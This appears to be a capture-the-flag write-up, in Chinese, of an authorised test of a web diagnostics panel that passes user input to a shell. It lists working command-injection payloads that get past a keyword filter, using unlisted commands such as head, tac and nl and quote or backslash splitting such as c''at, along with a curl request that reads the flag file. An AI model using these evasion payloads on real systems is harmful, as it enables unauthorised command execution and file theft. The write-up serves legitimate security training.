## 题目原文

> 某运维诊断面板对外提供检测功能，并在入口用一套自定义过滤规则限制用户输入。已获授权进行评估，设法绕过该过滤规则在服务器上取得受保护 flag。

## 题解

### 入口与指纹

入口标题是 `Network Diagnostics — Internal Tool`，`nginx/1.30.1`。页面一个输入框，字段名 `cmd`，占位符是 `ping 127.0.0.1`。POST 回当前路径，结果渲染在 `<pre>` 里。

### 关键观察

边界按命令名做整词匹配，匹配到就直接回 nginx 403，应用层的 `<pre>` 根本不会出现。没命中的命令会原样进 shell。

实测：

| 输入 | 结果 |
| --- | --- |
| `ping 127.0.0.1`、`id`、`whoami`、`ls /challenge`、`cat /challenge/flag1.txt`、`/bin/cat /challenge/flag1.txt` | 403，正文是 nginx Forbidden |
| `echo hello` | `<pre>` 里是 `hello` |
| `head /challenge/flag1.txt`、`tac /challenge/flag1.txt`、`nl /challenge/flag1.txt` | `<pre>` 里是 flag |
| `c''at /challenge/flag1.txt`、`c""at /challenge/flag1.txt`、`ca\t /challenge/flag1.txt` | 同样读到 flag |

两条路都成立。`head`、`tac`、`nl` 不在关键字表里，请求本身就能穿过边界。引号和反斜杠则是另一条路：边界看到的是不连续的 `c''at`，shell 把引号吃掉之后执行的仍是 `cat`。

### 利用链

```bash
T=$(head -1 .target)
curl -sS --data-urlencode "cmd=head /challenge/flag1.txt" "http://$T/"
```

本次平台接受的值是 `flag{da71f3c9-287f-4380-9941-9d81d1f40e1a}`。

### flag 位置

入口容器的 `/challenge/flag1.txt`。诊断接口把命令输出写进 `<pre>`，flag 就在这段输出里。
